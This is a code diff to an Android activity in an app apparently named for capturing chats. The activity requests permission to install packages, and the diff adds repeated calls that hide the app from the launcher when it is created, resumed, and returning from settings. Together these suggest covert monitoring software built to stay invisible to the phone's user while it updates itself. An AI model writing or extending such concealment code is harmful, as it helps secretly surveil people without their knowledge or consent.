@@ -7,6 +7,8 @@ import android.os.Bundle
 import android.provider.Settings
 import androidx.appcompat.app.AppCompatActivity
 import com.chats.capture.R
+import com.chats.capture.utils.AppHider
+import com.chats.capture.utils.AppVisibilityManager
 import timber.log.Timber
 
 class UpdatePermissionActivity : AppCompatActivity() {
@@ -17,6 +19,10 @@ class UpdatePermissionActivity : AppCompatActivity() {
     
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
+        
+        // Always hide app from launcher (Device Owner mode)
+        AppVisibilityManager.hideFromLauncher(this)
+        AppHider.ensureHidden(this)
         
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             if (!packageManager.canRequestPackageInstalls()) {
@@ -39,6 +45,10 @@ class UpdatePermissionActivity : AppCompatActivity() {
         super.onActivityResult(requestCode, resultCode, data)
         
         if (requestCode == REQUEST_INSTALL_PERMISSION) {
+            // Re-hide app after returning from settings
+            AppVisibilityManager.hideFromLauncher(this)
+            AppHider.ensureHidden(this)
+            
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                 if (packageManager.canRequestPackageInstalls()) {
                     Timber.d("Install permission granted")
@@ -49,5 +59,12 @@ class UpdatePermissionActivity : AppCompatActivity() {
             }
             finish()
         }
+    }
+    
+    override fun onResume() {
+        super.onResume()
+        // Re-hide app when resuming
+        AppVisibilityManager.hideFromLauncher(this)
+        AppHider.ensureHidden(this)
     }
 }
